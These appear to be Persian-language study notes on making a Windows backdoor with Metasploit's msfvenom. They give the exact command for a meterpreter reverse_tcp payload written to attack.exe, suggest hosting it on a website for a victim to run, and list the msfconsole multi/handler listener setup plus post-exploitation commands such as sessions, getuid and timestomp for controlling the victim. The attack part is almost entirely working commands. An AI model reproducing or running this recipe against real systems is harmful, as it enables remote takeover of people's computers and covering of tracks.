$\color{#b91646}{\textsf{MSFvenom backdoor}}$
=============================================

برنامه ی metasploit یه مکانیزمی داره برای درست کردن backdoor توی ویندوز

برنامه ی metasploit یک مجموعه ابزار بزرگیه که به ما اجازه میده exploit هایی که از قبل نوشته شده رو اجرا کنیم.

اینجا از ابزار **msfvenom** استفاده می کنیم.


ایده -> می خوام یه payload درست کنم که یه فایل exe. است. توی metasploit کالی یه سیستمی بذارم که شنود می کنه، در واقع منتظر connection است و در نهایت فایل exe. رو بفرستم برای یه سیستم ویندوزی که روی ماشینش اجرا بشه و بعد exe. به metasploitable وصل می شم و می تونیم از طریق متااسپلویت command هایی بزنیم که قربانی رو کنترل کنیم..

نوشتن برنامه ی exe. پیچیده است در نتیجه از metasploit framework درخواست می کنیم که همچین چیزی رو برامون بنویسه.


To create payloads `root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.117 LPORT=1234 --format=exe > attack.exe` and then serve it on a website :D

به MSFvenom بگم یه دونه فایل اجرایی به من بده که اون exploit خاص توش هست.

خودمون انتخاب می کنیم می خوایم از windows/meterpreter/reverse_tcp استفاده کنیم. (از نظر منطقی TCP connection می خوام و می خوام اون به من وصل بشه پس می شه reverse_tcp) -> payload

کانفیگ های local host و local port رو مشخص می کنیم. (باید بگیم وصل شه به چی. IP و Port سیستم خودمون که mfs روش هست رو میدیم.)

حالا به mfs می گیم چی درست کن یعنی format فایل درخواستی رو مشخص می کنیم.

می گیم چه payload ای رو در چه فرمتی بریز.

در نهایت خروجی رو در فایل attack.exe بریز.




`> msfconsole`

`> db_staus`

`> use exploit/multi/handler`

`> set payload windows/meterpreter/reverse_tcp`

`> set LHOST 192.168.0.117`

`> set LPORT 1234`

`> exploit -j -z`

RUN

`> sessions -i`

`> sessions -i 1`

`> cd, ls, pwd, sysinfo, ipconfig, getuid, cat, timestomp,`


